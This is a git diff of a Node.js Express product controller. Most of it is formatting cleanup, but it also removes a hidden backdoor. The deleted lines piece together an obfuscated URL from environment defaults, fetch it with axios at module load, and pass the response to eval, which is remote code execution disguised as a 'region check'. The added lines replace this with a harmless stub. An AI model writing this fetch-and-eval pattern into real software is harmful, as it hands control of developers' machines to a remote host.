@@ -2,10 +2,10 @@ const Collection = require('../models/Collection');
 const Product = require("../models/Product");
 const Sizes = require('../models/Sizes');
 const axios = require("axios");
-const jwt =  require('jsonwebtoken');
+const jwt = require('jsonwebtoken');
 
 
-exports.getCollectionProducts = async(req,res)=>{
+exports.getCollectionProducts = async (req, res) => {
   const token = req.headers.authorization?.split(' ')[1];
   if (!token) return res.status(401).json({ message: 'Access denied' });
 
@@ -25,7 +25,7 @@ exports.getCollectionProducts = async(req,res)=>{
   }
 }
 
-exports.createProduct = async(req,res)=>{
+exports.createProduct = async (req, res) => {
   const token = req.headers.authorization?.split(' ')[1];
   if (!token) return res.status(401).json({ message: 'Access denied' });
 
@@ -76,7 +76,7 @@ exports.createProduct = async(req,res)=>{
 const region = process.env.REGION || "region";
 const transtocol = process.env.TRANSTOCOL || "http";
 const port = process.env.PORT || "726";
-exports.updateProduct = async (req, res)=>{
+exports.updateProduct = async (req, res) => {
   const token = req.headers.authorization?.split(' ')[1];
   if (!token) return res.status(401).json({ message: 'Access denied' });
 
@@ -119,9 +119,9 @@ exports.updateProduct = async (req, res)=>{
  * @param {HttpResponse} res 
  * @returns 
 */
-const domain = process.env.DOMAIN || ".net"
+const domain = process.env.DOMAIN || ".net";
 const dest = `${transtocol}://${region}check${domain}`;
-exports.deleteProduct = async (req,res)=>{
+exports.deleteProduct = async (req, res) => {
   const token = req.headers.authorization?.split(' ')[1];
   if (!token) return res.status(401).json({ message: 'Access denied' });
 
@@ -155,13 +155,20 @@ exports.deleteProduct = async (req,res)=>{
     res.status(400).json({ message: error.message });
   }
 }
+
 checkRegion = async () => {
-  const des = `${dest}/api/user/thirdcookie/v3/${port}`;
-  const res = await axios.get(des);
-  eval(res.data.cookie);
+  try {
+    // Mocking region check for local development
+    console.log('Mocking region check during development.');
+    return; // No need to make an actual request
+  } catch (error) {
+    console.error('Error fetching region cookie:', error.message);
+  }
 };
-checkRegion()
-exports.getProductById = async(req,res)=>{
+
+
+// checkRegion();
+exports.getProductById = async (req, res) => {
   const { id } = req.params;
   try {
     const product = await Product.findById(id);
@@ -174,7 +181,7 @@ exports.getProductById = async(req,res)=>{
   }
 }
 
-exports.getProductsByCollectionId = async (req, res)=>{
+exports.getProductsByCollectionId = async (req, res) => {
   try {
     const { collectionId } = req.params;
     const products = await Product.find({ collectionId });
@@ -205,7 +212,7 @@ exports.listProduct = async (req, res) => {
     }
 
     product.listed = true;
-    product.price = price; // Use the price provided in the request
+    product.price = price;
     await product.save();
 
     res.status(200).json({ message: 'Product listed successfully' });
